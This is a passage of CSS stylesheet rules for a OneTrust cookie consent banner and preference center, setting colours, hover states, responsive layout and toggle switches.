        #onetrust-pc-sdk input[type=submit].ot-sdk-button-primary:focus,
        #onetrust-pc-sdk input[type=reset].ot-sdk-button-primary:focus,
        #onetrust-pc-sdk input[type=button].ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy button.ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy input[type=submit].ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy input[type=reset].ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy input[type=button].ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy button.ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy input[type=submit].ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy input[type=reset].ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy input[type=button].ot-sdk-button-primary:focus {
            color: #fff;
            background-color: #1eaedb;
            border-color: #1eaedb
        }

        #onetrust-banner-sdk input[type=text],
        #onetrust-pc-sdk input[type=text],
        #ot-sdk-cookie-policy input[type=text] {
            height: 38px;
            padding: 6px 10px;
            background-color: #fff;
            border: 1px solid #d1d1d1;
            border-radius: 4px;
            box-shadow: none;
            box-sizing: border-box
        }

        #onetrust-banner-sdk input[type=text],
        #onetrust-pc-sdk input[type=text],
        #ot-sdk-cookie-policy input[type=text] {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }

        #onetrust-banner-sdk input[type=text]:focus,
        #onetrust-pc-sdk input[type=text]:focus,
        #ot-sdk-cookie-policy input[type=text]:focus {
            border: 1px solid #000;
            outline: 0
        }

        #onetrust-banner-sdk label,
        #onetrust-pc-sdk label,
        #ot-sdk-cookie-policy label {
            display: block;
            margin-bottom: .5rem;
            font-weight: 600
        }

        #onetrust-banner-sdk input[type=checkbox],
        #onetrust-pc-sdk input[type=checkbox],
        #ot-sdk-cookie-policy input[type=checkbox] {
            display: inline
        }

        #onetrust-banner-sdk ul,
        #onetrust-pc-sdk ul,
        #ot-sdk-cookie-policy ul {
            list-style: circle inside
        }

        #onetrust-banner-sdk ul,
        #onetrust-pc-sdk ul,
        #ot-sdk-cookie-policy ul {
            padding-left: 0;
            margin-top: 0
        }

        #onetrust-banner-sdk ul ul,
        #onetrust-pc-sdk ul ul,
        #ot-sdk-cookie-policy ul ul {
            margin: 1.5rem 0 1.5rem 3rem;
            font-size: 90%
        }

        #onetrust-banner-sdk li,
        #onetrust-pc-sdk li,
        #ot-sdk-cookie-policy li {
            margin-bottom: 1rem
        }

        #onetrust-banner-sdk th,
        #onetrust-banner-sdk td,
        #onetrust-pc-sdk th,
        #onetrust-pc-sdk td,
        #ot-sdk-cookie-policy th,
        #ot-sdk-cookie-policy td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #e1e1e1
        }

        #onetrust-banner-sdk button,
        #onetrust-pc-sdk button,
        #ot-sdk-cookie-policy button {
            margin-bottom: 1rem;
            font-family: inherit
        }

        #onetrust-banner-sdk .ot-sdk-container:after,
        #onetrust-banner-sdk .ot-sdk-row:after,
        #onetrust-pc-sdk .ot-sdk-container:after,
        #onetrust-pc-sdk .ot-sdk-row:after,
        #ot-sdk-cookie-policy .ot-sdk-container:after,
        #ot-sdk-cookie-policy .ot-sdk-row:after {
            content: "";
            display: table;
            clear: both
        }

        #onetrust-banner-sdk .ot-sdk-row,
        #onetrust-pc-sdk .ot-sdk-row,
        #ot-sdk-cookie-policy .ot-sdk-row {
            margin: 0;
            max-width: none;
            display: block
        }

        #onetrust-banner-sdk {
            box-shadow: 0 0 18px rgba(0, 0, 0, .2)
        }

        #onetrust-banner-sdk.otFlat {
            position: fixed;
            z-index: 2147483645;
            bottom: 0;
            right: 0;
            left: 0;
            background-color: #fff;
            max-height: 90%;
            overflow-x: hidden;
            overflow-y: auto
        }

        #onetrust-banner-sdk.otFlat.top {
            top: 0px;
            bottom: auto
        }

        #onetrust-banner-sdk.otRelFont {
            font-size: 1rem
        }

        #onetrust-banner-sdk>.ot-sdk-container {
            overflow: hidden
        }

        #onetrust-banner-sdk::-webkit-scrollbar {
            width: 11px
        }

        #onetrust-banner-sdk::-webkit-scrollbar-thumb {
            border-radius: 10px;
            background: #c1c1c1
        }

        #onetrust-banner-sdk {
            scrollbar-arrow-color: #c1c1c1;
            scrollbar-darkshadow-color: #c1c1c1;
            scrollbar-face-color: #c1c1c1;
            scrollbar-shadow-color: #c1c1c1
        }

        #onetrust-banner-sdk #onetrust-policy {
            margin: 1.25em 0 .625em 2em;
            overflow: hidden
        }

        #onetrust-banner-sdk #onetrust-policy .ot-gv-list-handler {
            float: left;
            font-size: .82em;
            padding: 0;
            margin-bottom: 0;
            border: 0;
            line-height: normal;
            height: auto;
            width: auto
        }

        #onetrust-banner-sdk #onetrust-policy-title {
            font-size: 1.2em;
            line-height: 1.3;
            margin-bottom: 10px
        }

        #onetrust-banner-sdk #onetrust-policy-text {
            clear: both;
            text-align: left;
            font-size: .88em;
            line-height: 1.4
        }

        #onetrust-banner-sdk #onetrust-policy-text * {
            font-size: inherit;
            line-height: inherit
        }

        #onetrust-banner-sdk #onetrust-policy-text a {
            font-weight: bold;
            margin-left: 5px
        }

        #onetrust-banner-sdk #onetrust-policy-title,
        #onetrust-banner-sdk #onetrust-policy-text {
            color: dimgray;
            float: left
        }

        #onetrust-banner-sdk #onetrust-button-group-parent {
            min-height: 1px;
            text-align: center
        }

        #onetrust-banner-sdk #onetrust-button-group {
            display: inline-block
        }

        #onetrust-banner-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-banner-sdk #onetrust-pc-btn-handler {
            background-color: #68b631;
            color: #fff;
            border-color: #68b631;
            margin-right: 1em;
            min-width: 125px;
            height: auto;
            white-space: normal;
            word-break: break-word;
            word-wrap: break-word;
            padding: 12px 10px;
            line-height: 1.2;
            font-size: .813em;
            font-weight: 600
        }

        #onetrust-banner-sdk #onetrust-pc-btn-handler.cookie-setting-link {
            background-color: #fff;
            border: none;
            color: #68b631;
            text-decoration: underline;
            padding-left: 0;
            padding-right: 0
        }

        #onetrust-banner-sdk .onetrust-close-btn-ui {
            width: 44px;
            height: 44px;
            background-size: 12px;
            border: none;
            position: relative;
            margin: auto;
            padding: 0
        }

        #onetrust-banner-sdk .banner_logo {
            display: none
        }

        #onetrust-banner-sdk.ot-bnr-w-logo .ot-bnr-logo {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            left: 0px
        }

        #onetrust-banner-sdk.ot-bnr-w-logo #onetrust-policy {
            margin-left: 65px
        }

        #onetrust-banner-sdk .ot-b-addl-desc {
            clear: both;
            float: left;
            display: block
        }

        #onetrust-banner-sdk #banner-options {
            float: left;
            display: table;
            margin-right: 0;
            margin-left: 1em;
            width: calc(100% - 1em)
        }

        #onetrust-banner-sdk .banner-option-input {
            cursor: pointer;
            width: auto;
            height: auto;
            border: none;
            padding: 0;
            padding-right: 3px;
            margin: 0 0 10px;
            font-size: .82em;
            line-height: 1.4
        }

        #onetrust-banner-sdk .banner-option-input * {
            pointer-events: none;
            font-size: inherit;
            line-height: inherit
        }

        #onetrust-banner-sdk .banner-option-input[aria-expanded=true]~.banner-option-details {
            display: block;
            height: auto
        }

        #onetrust-banner-sdk .banner-option-input[aria-expanded=true] .ot-arrow-container {
            transform: rotate(90deg)
        }

        #onetrust-banner-sdk .banner-option {
            margin-bottom: 12px;
            margin-left: 0;
            border: none;
            float: left;
            padding: 0
        }

        #onetrust-banner-sdk .banner-option:first-child {
            padding-left: 2px
        }

        #onetrust-banner-sdk .banner-option:not(:first-child) {
            padding: 0;
            border: none
        }

        #onetrust-banner-sdk .banner-option-header {
            cursor: pointer;
            display: inline-block
        }

        #onetrust-banner-sdk .banner-option-header :first-child {
            color: dimgray;
            font-weight: bold;
            float: left
        }

        #onetrust-banner-sdk .banner-option-header .ot-arrow-container {
            display: inline-block;
            border-top: 6px solid rgba(0, 0, 0, 0);
            border-bottom: 6px solid rgba(0, 0, 0, 0);
            border-left: 6px solid dimgray;
            margin-left: 10px;
            vertical-align: middle
        }

        #onetrust-banner-sdk .banner-option-details {
            display: none;
            font-size: .83em;
            line-height: 1.5;
            padding: 10px 0px 5px 10px;
            margin-right: 10px;
            height: 0px
        }

        #onetrust-banner-sdk .banner-option-details * {
            font-size: inherit;
            line-height: inherit;
            color: dimgray
        }

        #onetrust-banner-sdk .ot-arrow-container,
        #onetrust-banner-sdk .banner-option-details {
            transition: all 300ms ease-in 0s;
            -webkit-transition: all 300ms ease-in 0s;
            -moz-transition: all 300ms ease-in 0s;
            -o-transition: all 300ms ease-in 0s
        }

        #onetrust-banner-sdk .ot-dpd-container {
            float: left
        }

        #onetrust-banner-sdk .ot-dpd-title {
            margin-bottom: 10px
        }

        #onetrust-banner-sdk .ot-dpd-title,
        #onetrust-banner-sdk .ot-dpd-desc {
            font-size: .88em;
            line-height: 1.4;
            color: dimgray
        }

        #onetrust-banner-sdk .ot-dpd-title *,
        #onetrust-banner-sdk .ot-dpd-desc * {
            font-size: inherit;
            line-height: inherit
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text * {
            margin-bottom: 0
        }

        #onetrust-banner-sdk.ot-iab-2 .onetrust-vendors-list-handler {
            display: block;
            margin-left: 0;
            margin-top: 5px;
            clear: both;
            margin-bottom: 0;
            padding: 0;
            border: 0;
            height: auto;
            width: auto
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group button {
            display: block
        }

        #onetrust-banner-sdk.ot-close-btn-link {
            padding-top: 25px
        }

        #onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container {
            top: 15px;
            transform: none;
            right: 15px
        }

        #onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container button {
            padding: 0;
            white-space: pre-wrap;
            border: none;
            height: auto;
            line-height: 1.5;
            text-decoration: underline;
            font-size: .69em
        }

        #onetrust-banner-sdk #onetrust-policy-text,
        #onetrust-banner-sdk .ot-dpd-desc,
        #onetrust-banner-sdk .ot-b-addl-desc {
            font-size: .813em;
            line-height: 1.5
        }

        #onetrust-banner-sdk .ot-dpd-desc {
            margin-bottom: 10px
        }

        #onetrust-banner-sdk .ot-dpd-desc>.ot-b-addl-desc {
            margin-top: 10px;
            margin-bottom: 10px;
            font-size: 1em
        }

        @media only screen and (max-width: 425px) {
            #onetrust-banner-sdk #onetrust-close-btn-container {
                position: absolute;
                top: 6px;
                right: 2px
            }

            #onetrust-banner-sdk #onetrust-policy {
                margin-left: 0;
                margin-top: 3em
            }

            #onetrust-banner-sdk #onetrust-button-group {
                display: block
            }

            #onetrust-banner-sdk #onetrust-accept-btn-handler,
            #onetrust-banner-sdk #onetrust-reject-all-handler,
            #onetrust-banner-sdk #onetrust-pc-btn-handler {
                width: 100%
            }

            #onetrust-banner-sdk .onetrust-close-btn-ui {
                top: auto;
                transform: none
            }

            #onetrust-banner-sdk #onetrust-policy-title {
                display: inline;
                float: none
            }

            #onetrust-banner-sdk #banner-options {
                margin: 0;
                padding: 0;
                width: 100%
            }
        }

        @media only screen and (min-width: 426px)and (max-width: 896px) {
            #onetrust-banner-sdk #onetrust-close-btn-container {
                position: absolute;
                top: 0;
                right: 0
            }

            #onetrust-banner-sdk #onetrust-policy {
                margin-left: 1em;
                margin-right: 1em
            }

            #onetrust-banner-sdk .onetrust-close-btn-ui {
                top: 10px;
                right: 10px
            }

            #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container {
                width: 95%
            }

            #onetrust-banner-sdk.ot-iab-2 #onetrust-group-container {
                width: 100%
            }

            #onetrust-banner-sdk.ot-bnr-w-logo #onetrust-button-group-parent {
                padding-left: 50px
            }

            #onetrust-banner-sdk #onetrust-button-group-parent {
                width: 100%;
                position: relative;
                margin-left: 0
            }

            #onetrust-banner-sdk #onetrust-button-group button {
                display: inline-block
            }

            #onetrust-banner-sdk #onetrust-button-group {
                margin-right: 0;
                text-align: center
            }

            #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler {
                float: left
            }

            #onetrust-banner-sdk .has-reject-all-button #onetrust-reject-all-handler,
            #onetrust-banner-sdk .has-reject-all-button #onetrust-accept-btn-handler {
                float: right
            }

            #onetrust-banner-sdk .has-reject-all-button #onetrust-button-group {
                width: calc(100% - 2em);
                margin-right: 0
            }

            #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler.cookie-setting-link {
                padding-left: 0px;
                text-align: left
            }

            #onetrust-banner-sdk.ot-buttons-fw .ot-sdk-three button {
                width: 100%;
                text-align: center
            }

            #onetrust-banner-sdk.ot-buttons-fw #onetrust-button-group-parent button {
                float: none
            }

            #onetrust-banner-sdk.ot-buttons-fw #onetrust-pc-btn-handler.cookie-setting-link {
                text-align: center
            }
        }

        @media only screen and (min-width: 550px) {
            #onetrust-banner-sdk .banner-option:not(:first-child) {
                border-left: 1px solid #d8d8d8;
                padding-left: 25px
            }
        }

        @media only screen and (min-width: 425px)and (max-width: 550px) {

            #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group,
            #onetrust-banner-sdk.ot-iab-2 #onetrust-policy,
            #onetrust-banner-sdk.ot-iab-2 .banner-option {
                width: 100%
            }
        }

        @media only screen and (min-width: 769px) {
            #onetrust-banner-sdk #onetrust-button-group {
                margin-right: 30%
            }

            #onetrust-banner-sdk #banner-options {
                margin-left: 2em;
                margin-right: 5em;
                margin-bottom: 1.25em;
                width: calc(100% - 7em)
            }
        }

        @media only screen and (min-width: 897px)and (max-width: 1023px) {
            #onetrust-banner-sdk.vertical-align-content #onetrust-button-group-parent {
                position: absolute;
                top: 50%;
                left: 75%;
                transform: translateY(-50%)
            }

            #onetrust-banner-sdk #onetrust-close-btn-container {
                top: 50%;
                margin: auto;
                transform: translate(-50%, -50%);
                position: absolute;
                padding: 0;
                right: 0
            }

            #onetrust-banner-sdk #onetrust-close-btn-container button {
                position: relative;
                margin: 0;
                right: -22px;
                top: 2px
            }
        }

        @media only screen and (min-width: 1024px) {
            #onetrust-banner-sdk #onetrust-close-btn-container {
                top: 50%;
                margin: auto;
                transform: translate(-50%, -50%);
                position: absolute;
                right: 0
            }

            #onetrust-banner-sdk #onetrust-close-btn-container button {
                right: -12px
            }

            #onetrust-banner-sdk #onetrust-policy {
                margin-left: 2em
            }

            #onetrust-banner-sdk.vertical-align-content #onetrust-button-group-parent {
                position: absolute;
                top: 50%;
                left: 60%;
                transform: translateY(-50%)
            }

            #onetrust-banner-sdk .ot-optout-signal {
                width: 50%
            }

            #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-title {
                width: 50%
            }

            #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text,
            #onetrust-banner-sdk.ot-iab-2 :not(.ot-dpd-desc)>.ot-b-addl-desc {
                margin-bottom: 1em;
                width: 50%;
                border-right: 1px solid #d8d8d8;
                padding-right: 1rem
            }

            #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text {
                margin-bottom: 0;
                padding-bottom: 1em
            }

            #onetrust-banner-sdk.ot-iab-2 :not(.ot-dpd-desc)>.ot-b-addl-desc {
                margin-bottom: 0;
                padding-bottom: 1em
            }

            #onetrust-banner-sdk.ot-iab-2 .ot-dpd-container {
                width: 45%;
                padding-left: 1rem;
                display: inline-block;
                float: none
            }

            #onetrust-banner-sdk.ot-iab-2 .ot-dpd-title {
                line-height: 1.7
            }

            #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group-parent {
                left: auto;
                right: 4%;
                margin-left: 0
            }

            #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group button {
                display: block
            }

            #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-button-group-parent {
                margin: auto;
                width: 30%
            }

            #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container {
                width: 60%
            }

            #onetrust-banner-sdk #onetrust-button-group {
                margin-right: auto
            }

            #onetrust-banner-sdk #onetrust-accept-btn-handler,
            #onetrust-banner-sdk #onetrust-reject-all-handler,
            #onetrust-banner-sdk #onetrust-pc-btn-handler {
                margin-top: 1em
            }
        }

        @media only screen and (min-width: 890px) {
            #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group-parent {
                padding-left: 3%;
                padding-right: 4%;
                margin-left: 0
            }

            #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group {
                margin-right: 0;
                margin-top: 1.25em;
                width: 100%
            }

            #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group button {
                width: 100%;
                margin-bottom: 5px;
                margin-top: 5px
            }

            #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group button:last-of-type {
                margin-bottom: 20px
            }
        }

        @media only screen and (min-width: 1280px) {
            #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container {
                width: 55%
            }

            #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-button-group-parent {
                width: 44%;
                padding-left: 2%;
                padding-right: 2%
            }

            #onetrust-banner-sdk:not(.ot-iab-2).vertical-align-content #onetrust-button-group-parent {
                position: absolute;
                left: 55%
            }
        }

        #onetrust-consent-sdk #onetrust-banner-sdk {
            background-color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-policy-title,
        #onetrust-consent-sdk #onetrust-policy-text,
        #onetrust-consent-sdk .ot-b-addl-desc,
        #onetrust-consent-sdk .ot-dpd-desc,
        #onetrust-consent-sdk .ot-dpd-title,
        #onetrust-consent-sdk #onetrust-policy-text *:not(.onetrust-vendors-list-handler),
        #onetrust-consent-sdk .ot-dpd-desc *:not(.onetrust-vendors-list-handler),
        #onetrust-consent-sdk #onetrust-banner-sdk #banner-options *,
        #onetrust-banner-sdk .ot-cat-header,
        #onetrust-banner-sdk .ot-optout-signal {
            color: #383b3e;
        }

        #onetrust-consent-sdk #onetrust-banner-sdk .banner-option-details {
            background-color: #E9E9E9;
        }

        #onetrust-consent-sdk #onetrust-banner-sdk a[href],
        #onetrust-consent-sdk #onetrust-banner-sdk a[href] font,
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-link-btn {
            color: #333333;
        }

        #onetrust-consent-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler {
            background-color: #c41f3e;
            border-color: #c41f3e;
            color: #8B1D41;
        }

        #onetrust-consent-sdk #onetrust-banner-sdk *:focus,
        #onetrust-consent-sdk #onetrust-banner-sdk:focus {
            outline-color: #606366;
            outline-width: 1px;
        }

        #onetrust-consent-sdk #onetrust-pc-btn-handler,
        #onetrust-consent-sdk #onetrust-pc-btn-handler.cookie-setting-link {
            color: #c41f3e;
            border-color: #c41f3e;
            background-color:
                #FFFFFF;
        }

        #onetrust-policy {
            margin: 2em 0 2em 2em !important;
        }

        #onetrust-pc-btn-handler,
        #onetrust-reject-all-handler,
        #onetrust-accept-btn-handler {
            border-radius: 0.25rem !important;
            min-height: 3rem !important;
            padding: 0.6875rem 1.875rem !important;
            background-color: #FFF !important;
            border: 1px solid #C41F3E !important;
            font-size: 1rem !important;
            color: #C41F3E !important;
        }

        #onetrust-pc-btn-handler:hover,
        #onetrust-reject-all-handler:hover,
        #onetrust-accept-btn-handler:hover {
            background-color: #8B1D41 !important;
            color: #FFF !important;
            opacity: 1 !important;
            border-color: #8B1D41 !important;
        }

        #onetrust-policy-text {
            font-size: 1em !important;
        }

        #ot-sdk-btn-floating {
            display: none !important;
        }

        .lang-selector {
            margin-bottom: 5px !important;
        }

        .left-selector {
            margin-left: 0 !important;
            margin-right: .3em;
            text-decoration: none;
            font-size: .8em;
            text-decoration: none !important;
            border-bottom: 1px solid #383B3E !important;
        }

        .right-selector {
            margin-left: 0 !important;
            margin-left: .3em;
            text-decoration: none;
            font-size: .8em;
            text-decoration: none !important;
            border-bottom: 1px solid #383B3E !important;
        }

        .left-selector:hover,
        .right-selector:hover {
            color: #C41F3E !important;
            border-bottom: 1px solid #C41F3E !important;
        }

        .policy-link {
            font-weight: bold !important;
            margin-left: 0 !important;
            text-decoration: none !important;
            border-bottom: 1px solid #383B3E !important;
        }

        .policy-link:hover {
            border-bottom: 1px solid #C41F3E !important;
            color: #C41F3E !important;
        }

        .onetrust-close-btn-ui {
            width: 25px !important;
            height: 25px !important;
        }

        #close-pc-btn-handler,
        .ot-close-icon {
            top: 0px !important;
            right: 7px !important;
        }

        .onetrust-close-btn-ui:hover,
        .banner-close-button:hover,
        .ot-close-icon:hover {
            filter: invert(24%) sepia(47%) saturate(3679%) hue-rotate(330deg) brightness(82%) contrast(101%) !important;
            opacity: 1 !important;
            border-bottom: 1px solid #C41F3E !important;
        }

        @media only screen and (min-width: 426px) and (max-width: 896px) {
            #onetrust-banner-sdk {
                padding-bottom: 1rem !important;
            }
        }

        @media only screen and (min-width: 769px) {

            #onetrust-banner-sdk,
            #onetrust-button-group {
                margin-right: 0 !important;
            }
        }

        @media only screen and (min-width: 1024px) {
            #onetrust-close-btn-container {
                top: 9% !important;
                right: -0.2% !important;
            }
        }

        @media only screen and (max-width: 600px) {
            .onetrust-close-btn-ui {
                width: 44px !important;
                height: 44px !important;
            }

            #close-pc-btn-handler,
            .ot-close-icon {
                top: 10px !important;
                right: 10px !important;
            }
        }

        #onetrust-pc-sdk.otPcCenter {
            overflow: hidden;
            position: fixed;
            margin: 0 auto;
            top: 5%;
            right: 0;
            left: 0;
            width: 40%;
            max-width: 575px;
            min-width: 575px;
            border-radius: 2.5px;
            z-index: 2147483647;
            background-color: #fff;
            -webkit-box-shadow: 0px 2px 10px -3px #999;
            -moz-box-shadow: 0px 2px 10px -3px #999;
            box-shadow: 0px 2px 10px -3px #999
        }

        #onetrust-pc-sdk.otPcCenter[dir=rtl] {
            right: 0;
            left: 0
        }

        #onetrust-pc-sdk.otRelFont {
            font-size: 1rem
        }

        #onetrust-pc-sdk .ot-optout-signal {
            margin-top: .625rem
        }

        #onetrust-pc-sdk #ot-addtl-venlst .ot-arw-cntr,
        #onetrust-pc-sdk #ot-addtl-venlst .ot-plus-minus,
        #onetrust-pc-sdk .ot-hide-tgl {
            visibility: hidden
        }

        #onetrust-pc-sdk #ot-addtl-venlst .ot-arw-cntr *,
        #onetrust-pc-sdk #ot-addtl-venlst .ot-plus-minus *,
        #onetrust-pc-sdk .ot-hide-tgl * {
            visibility: hidden
        }

        #onetrust-pc-sdk #ot-gn-venlst .ot-ven-item .ot-acc-hdr {
            min-height: 40px
        }

        #onetrust-pc-sdk .ot-pc-header {
            height: 39px;
            padding: 10px 0 10px 30px;
            border-bottom: 1px solid #e9e9e9
        }

        #onetrust-pc-sdk #ot-pc-title,
        #onetrust-pc-sdk #ot-category-title,
        #onetrust-pc-sdk .ot-cat-header,
        #onetrust-pc-sdk #ot-lst-title,
        #onetrust-pc-sdk .ot-ven-hdr .ot-ven-name,
        #onetrust-pc-sdk .ot-always-active {
            font-weight: bold;
            color: dimgray
        }

        #onetrust-pc-sdk .ot-always-active-group .ot-cat-header {
            width: 55%;
            font-weight: 700
        }

        #onetrust-pc-sdk .ot-cat-item p {
            clear: both;
            float: left;
            margin-top: 10px;
            margin-bottom: 5px;
            line-height: 1.5;
            font-size: .812em;
            color: dimgray
        }

        #onetrust-pc-sdk .ot-close-icon {
            height: 44px;
            width: 44px;
            background-size: 10px
        }

        #onetrust-pc-sdk #ot-pc-title {
            float: left;
            font-size: 1em;
            line-height: 1.5;
            margin-bottom: 10px;
            margin-top: 10px;
            width: 100%
        }

        #onetrust-pc-sdk #accept-recommended-btn-handler {
            margin-right: 10px;
            margin-bottom: 25px;
            outline-offset: -1px
        }

        #onetrust-pc-sdk #ot-pc-desc {
            clear: both;
            width: 100%;
            font-size: .812em;
            line-height: 1.5;
            margin-bottom: 25px
        }

        #onetrust-pc-sdk #ot-pc-desc a {
            margin-left: 5px
        }

        #onetrust-pc-sdk #ot-pc-desc * {
            font-size: inherit;
            line-height: inherit
        }

        #onetrust-pc-sdk #ot-pc-desc ul li {
            padding: 10px 0px
        }

        #onetrust-pc-sdk a {
            color: #656565;
            cursor: pointer
        }

        #onetrust-pc-sdk a:hover {
            color: #3860be
        }

        #onetrust-pc-sdk label {
            margin-bottom: 0
        }

        #onetrust-pc-sdk #vdr-lst-dsc {
            font-size: .812em;
            line-height: 1.5;
            padding: 10px 15px 5px 15px
        }

        #onetrust-pc-sdk button {
            max-width: 394px;
            padding: 12px 30px;
            line-height: 1;
            word-break: break-word;
            word-wrap: break-word;
            white-space: normal;
            font-weight: bold;
            height: auto
        }

        #onetrust-pc-sdk .ot-link-btn {
            padding: 0;
            margin-bottom: 0;
            border: 0;
            font-weight: normal;
            line-height: normal;
            width: auto;
            height: auto
        }

        #onetrust-pc-sdk #ot-pc-content {
            position: absolute;
            overflow-y: scroll;
            padding-left: 0px;
            padding-right: 30px;
            top: 60px;
            bottom: 110px;
            margin: 1px 3px 0 30px;
            width: calc(100% - 63px)
        }

        #onetrust-pc-sdk .ot-vs-list .ot-always-active,
        #onetrust-pc-sdk .ot-cat-grp .ot-always-active {
            float: right;
            clear: none;
            color: #3860be;
            margin: 0;
            font-size: .813em;
            line-height: 1.3
        }

        #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar-track {
            margin-right: 20px
        }

        #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar {
            width: 11px
        }

        #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar-thumb {
            border-radius: 10px;
            background: #d8d8d8
        }

        #onetrust-pc-sdk input[type=checkbox]:focus+.ot-acc-hdr {
            outline: #000 1px solid
        }

        #onetrust-pc-sdk .ot-pc-scrollbar {
            scrollbar-arrow-color: #d8d8d8;
            scrollbar-darkshadow-color: #d8d8d8;
            scrollbar-face-color: #d8d8d8;
            scrollbar-shadow-color: #d8d8d8
        }

        #onetrust-pc-sdk .save-preference-btn-handler {
            margin-right: 20px
        }

        #onetrust-pc-sdk .ot-pc-refuse-all-handler {
            margin-right: 10px
        }

        #onetrust-pc-sdk #ot-pc-desc .privacy-notice-link {
            margin-left: 0;
            margin-right: 8px
        }

        #onetrust-pc-sdk #ot-pc-desc .ot-imprint-handler {
            margin-left: 0;
            margin-right: 8px
        }

        #onetrust-pc-sdk .ot-subgrp-cntr {
            display: inline-block;
            clear: both;
            width: 100%;
            padding-top: 15px
        }

        #onetrust-pc-sdk .ot-switch+.ot-subgrp-cntr {
            padding-top: 10px
        }

        #onetrust-pc-sdk ul.ot-subgrps {
            margin: 0;
            font-size: initial
        }

        #onetrust-pc-sdk ul.ot-subgrps li p,
        #onetrust-pc-sdk ul.ot-subgrps li h5 {
            font-size: .813em;
            line-height: 1.4;
            color: dimgray
        }

        #onetrust-pc-sdk ul.ot-subgrps .ot-switch {
            min-height: auto
        }

        #onetrust-pc-sdk ul.ot-subgrps .ot-switch-nob {
            top: 0
        }

        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr {
            display: inline-block;
            width: 100%
        }

        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-txt {
            margin: 0
        }

        #onetrust-pc-sdk ul.ot-subgrps li {
            padding: 0;
            border: none
        }

        #onetrust-pc-sdk ul.ot-subgrps li h5 {
            position: relative;
            top: 5px;
            font-weight: bold;
            margin-bottom: 0;
            float: left
        }

        #onetrust-pc-sdk li.ot-subgrp {
            margin-left: 20px;
            overflow: auto
        }

        #onetrust-pc-sdk li.ot-subgrp>h5 {
            width: calc(100% - 100px)
        }

        #onetrust-pc-sdk .ot-cat-item p>ul,
        #onetrust-pc-sdk li.ot-subgrp p>ul {
            margin: 0px;
            list-style: disc;
            margin-left: 15px;
            font-size: inherit
        }

        #onetrust-pc-sdk .ot-cat-item p>ul li,
        #onetrust-pc-sdk li.ot-subgrp p>ul li {
            font-size: inherit;
            padding-top: 10px;
            padding-left: 0px;
            padding-right: 0px;
            border: none
        }

        #onetrust-pc-sdk .ot-cat-item p>ul li:last-child,
        #onetrust-pc-sdk li.ot-subgrp p>ul li:last-child {
            padding-bottom: 10px
        }

        #onetrust-pc-sdk .ot-pc-logo {
            height: 40px;
            width: 120px
        }

        #onetrust-pc-sdk .ot-pc-footer {
            position: absolute;
            bottom: 0px;
            width: 100%;
            max-height: 160px;
            border-top: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-pc-refuse-all-handler {
            margin-bottom: 0px
        }

        #onetrust-pc-sdk.ot-ftr-stacked #ot-pc-content {
            bottom: 160px
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-pc-footer button {
            width: 100%;
            max-width: none
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-container {
            margin: 0 30px;
            width: calc(100% - 60px);
            padding-right: 0
        }

        #onetrust-pc-sdk .ot-pc-footer-logo {
            height: 30px;
            width: 100%;
            text-align: right;
            background: #f4f4f4
        }

        #onetrust-pc-sdk .ot-pc-footer-logo a {
            display: inline-block;
            margin-top: 5px;
            margin-right: 10px
        }

        #onetrust-pc-sdk[dir=rtl] .ot-pc-footer-logo {
            direction: rtl
        }

        #onetrust-pc-sdk[dir=rtl] .ot-pc-footer-logo a {
            margin-right: 25px
        }

        #onetrust-pc-sdk .ot-tgl {
            float: right;
            position: relative;
            z-index: 1
        }

        #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob {
            background-color: #cddcf2;
            border: 1px solid #3860be
        }

        #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob:before {
            -webkit-transform: translateX(20px);
            -ms-transform: translateX(20px);
            transform: translateX(20px);
            background-color: #3860be;
            border-color: #3860be
        }

